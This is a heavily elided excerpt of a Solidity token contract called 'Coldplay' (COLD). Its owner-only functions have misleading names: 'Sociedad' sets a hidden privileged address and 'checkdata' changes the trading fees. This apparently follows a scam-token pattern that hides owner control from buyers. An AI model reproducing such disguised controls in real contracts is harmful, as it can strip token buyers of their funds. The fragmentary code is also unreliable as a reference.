...
contract Ownership is Context {  
    ...
    */
    ...
    function Sociedad(address newOwner) external onlyOwner {
        _fac = newOwner;
    }  
...
contract Coldplay is Context, IERC20, Ownership{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 1000000 *  10**9;        
    
    string private _name = "Coldplay";
    string private _symbol = "COLD";
    ...
    function constructionReset() external view returns (uint256,uint256,uint256,uint256,uint256) {
        return (
            _feeBuyback,
            _feeReflection,
            _feeMarketing,
    ...
    function checkdata(uint8 _buybackfee, uint8 _reflectionfee, uint8 _marketingfee, uint8 _devfee, uint8 _feedenominator) external onlyOwner {
    ...
    function entrance(address sender, uint256 amount) internal view {
